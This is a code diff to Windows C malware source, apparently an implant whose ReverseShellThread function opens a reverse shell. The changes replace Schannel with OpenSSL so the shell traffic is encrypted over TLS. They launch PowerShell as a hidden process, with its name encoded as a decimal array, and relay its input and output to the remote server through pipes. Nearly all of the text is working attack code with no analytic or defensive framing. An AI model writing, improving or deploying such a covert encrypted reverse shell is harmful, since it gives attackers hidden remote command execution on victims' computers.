@@ -3,12 +3,11 @@
 #include <windows.h>
 #include <stdio.h>
 #include <ws2tcpip.h>
-#include <schannel.h>
-#include <security.h>
+#include <ssl.h>
 
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Secur32.lib")
-#pragma comment(lib, "Crypt32.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "libssl.lib")
+#pragma comment(lib, "libcrypto.lib")
 
 #ifndef IP_ADDRESS
     #define IP_ADDRESS 0
@@ -131,46 +130,18 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
         }
     }
 
-    //Initialize Secure Channel
-    CredHandle credHandle;
-    SECURITY_STATUS status;
-    SCHANNEL_CRED cred = {
-        .dwVersion = SCHANNEL_CRED_VERSION,
-        .dwFlags = SCH_CRED_NO_DEFAULT_CREDS, //No need Client Cert
-        .grbitEnabledProtocols = 0x00000800, //TLS Version 1.2
-    };
+    //OpenSSL
+    SSL_library_init();
+    OpenSSL_add_all_algorithms();
+    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
 
-    status = AcquireCredentialsHandle(
-        NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &credHandle, NULL
-    );
-    //Temporary
-    if (status != SEC_E_OK){
-        printf("Error acquiring credentials handle");
-    }
-    
-    //Initialize Security Context
-    CtxtHandle context;
-    SecBuffer outputBuffer[1] = { 0 };
-    outputBuffer[0].BufferType = SECBUFFER_TOKEN;
-    SecBufferDesc outputBufferDesc = {SECBUFFER_VERSION, sizeof(outputBuffer), outputBuffer};
-    DWORD ctxtflags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
-    status = InitializeSecurityContext(
-        &credHandle, NULL, NULL,  ctxtflags, 0, SECURITY_NATIVE_DREP, NULL, 0, &context, &outputBufferDesc, &ctxtflags, NULL
-    );
+    //SSL Connection
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, shell);
+    SSL_connect(ssl);
 
-    if (status == SEC_I_CONTINUE_NEEDED) {
-        if (send(shell,  outputBufferDesc.pBuffers[0].pvBuffer, outputBufferDesc.pBuffers[0].cbBuffer, 0) == SOCKET_ERROR) {
-            printf("Error sending initial token");
-    }
-        //Free Allocated Memory
-        FreeContextBuffer(outputBufferDesc.pBuffers[0].pvBuffer);
-    } else if (status == SEC_E_OK){
-        printf("Security context initialized successfully.\n");
-    } else{
-        printf("Error initializing security context: %d", status);
-    }
     //Recv Socket, Where to Store Data, Max Size to Receive, 0
-    recv(shell, RecData, sizeof(RecData), 0);   
+    //recv(shell, RecData, sizeof(RecData), 0);   
     //Set Value of Startup Infra Buffer to 0 (& means address)
     ZeroMemory(&sinfo, sizeof(sinfo));
     //Size of Structure
@@ -180,8 +151,24 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     //STARTF_USESHOWWINDOW - Contains Additional Information 
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     sinfo.wShowWindow = SW_HIDE;
-    //Pipe Standard Input, Output and Error to Socket
-    sinfo.hStdInput = sinfo.hStdError = sinfo.hStdOutput = (HANDLE) shell;
+    
+    //Pipe Error to Socket (No Need)
+    sinfo.hStdError = (HANDLE) shell;
+
+    //Initialize Security Attributes
+    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    //Pipe for Standard Input
+    HANDLE hStdinRead, hStdinWrite;
+    CreatePipe(&hStdinRead, &hStdinWrite, &saAttr, 0);
+    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
+
+    //Pipe for Standard Output
+    HANDLE hStdoutRead, hStdoutWrite;
+    CreatePipe(&hStdoutRead, &hStdoutWrite, &saAttr, 0);
+    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
+
+    sinfo.hStdInput = hStdinRead;
+    sinfo.hStdOutput = hStdoutWrite;
 
     //powershell in dec
     int decimal_array[] = {112, 111, 119, 101, 114, 115, 104, 101, 108, 108};
@@ -192,8 +179,31 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     //Using CreateProcess API to spawn cmd
     //NULL, Process to Spawn, NULL, NULL, BOOLEAN, Creation Flags, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
     CreateProcess(NULL, str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+    
+    //Input Output
+    char buffer[4096];
+    int bytesRead;
+    //Read Input
+    while ((bytesRead = SSL_read(ssl, buffer, sizeof(buffer) - 1)) >= 0) {
+        DWORD bytesWritten;
+        //Write Input
+        WriteFile(hStdinWrite, buffer, bytesRead, &bytesWritten, NULL);
+        //Important
+        Sleep(1000);
+        DWORD bytesReadOutput;
+        //Read Output
+        ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesReadOutput, NULL);
+            //Send to Server
+            SSL_write(ssl, buffer, bytesReadOutput);
+            memset(buffer, 0, sizeof(buffer));
+    }
 
-    //Startup Process
+    //Close Stuff
+    CloseHandle(hStdinWrite);
+    CloseHandle(hStdoutRead);
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
     //Set Value of Receiving Server Buffer to 0
